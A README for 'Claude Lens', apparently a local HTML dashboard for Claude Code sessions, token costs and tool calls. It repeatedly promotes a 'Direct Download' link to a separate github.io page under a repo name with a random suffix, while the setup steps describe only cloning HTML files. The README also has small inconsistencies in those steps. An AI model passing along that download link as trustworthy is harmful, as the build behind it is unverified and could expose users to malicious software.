# Claude Lens v2026 - dashboard 2026

> **Claude Lens is a local dashboard for understanding Claude Code activity, giving you a clear view of sessions, token costs, cache performance, tool calls, and daily breakdowns in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-local-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adrianl19/claude-lens-win-53435?style=flat-square)](https://github.com/adrianl19/claude-lens-win-53435)

---

<p align="center">
  <a href="https://adrianl19.github.io/claude-lens-win-53435/">
    <img src="https://img.shields.io/badge/Download-Claude%20Lens%20Latest-brightgreen?style=for-the-badge" alt="Download Claude Lens">
  </a>
</p>

> **[Direct Download - Claude Lens v2026](https://adrianl19.github.io/claude-lens-win-53435/)**

---

[Download Latest Build](https://adrianl19.github.io/claude-lens-win-53435/)

---

## About Claude Lens

Claude Lens is a local dashboard built to make Claude Code usage easier to inspect at a glance. It brings together activity data from sessions, token costs, cache performance, tool calls, and daily breakdowns so you can review how usage changes over time without digging through raw output.

It is aimed at users who want a simple way to monitor their own Claude Code workflow on a local setup. By organizing usage details into visual summaries, Claude Lens helps turn detailed logs into a more readable picture of day-to-day activity.

---

## Features

- Visualizes Claude Code usage in a dashboard view
- Tracks sessions for easier session-level review
- Shows token costs in a structured format
- Analyzes cache performance over time
- Records tool calls for workflow inspection
- Displays daily breakdowns for usage trends
- Designed for local use and offline-friendly review
- Focused on quick access to usage analytics

---

## Installation

Clone or download the repository, then open the project in your local environment.

1. Clone the repo:
   `git clone https://github.com/adrianl19/claude-lens-win-53435.git
2. Change into the project directory:
   `cd claude-lens`
3. Open or serve the HTML dashboard with your preferred local web server or static file host.

If you downloaded a release or build archive, extract it and launch the included HTML entry point in a browser or local server.

---

## Usage

Open the dashboard in your browser after starting it locally. Once your Claude Code data is available, use the interface to review:

- session history
- token cost summaries
- cache performance patterns
- tool call activity
- daily usage breakdowns

For regular review, refresh the data source you use with Claude Lens and revisit the dashboard whenever you want to check recent activity or compare changes across days.

---

## Configuration

Claude Lens is intended to run locally, so configuration is typically handled through the project files or the data source you connect to it.

If you need to adjust settings, look for:
- the main HTML entry file
- any script or asset files included with the dashboard
- the local data path or input format used for Claude Code analytics

Example:

    {
      "dataSource": "./data/",
      "refreshInterval": 300,
      "timeZone": "local"
    }

---

## Requirements

- A local environment for running or serving the dashboard
- A modern web browser
- Claude Code usage data available for analysis
- HTML support for the project files
- Enough local storage for the logs or data you want to inspect

---

## FAQ

**How do I start using it?**  
Open the dashboard locally after cloning or downloading the project, then load your Claude Code usage data.

**Does it update automatically?**  
That depends on how you run it and how often your local data source is refreshed.

**Where are settings kept?**  
Settings are usually stored in the project files or in the local configuration you set up for your data source.

**What if the dashboard is blank?**  
Check that the data path, input file, or local server setup matches the expected format and that your Claude Code data is available.

**Can I change the layout or metrics?**  
Yes, if you are working with the source files, you can adjust the dashboard to fit your preferred view.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
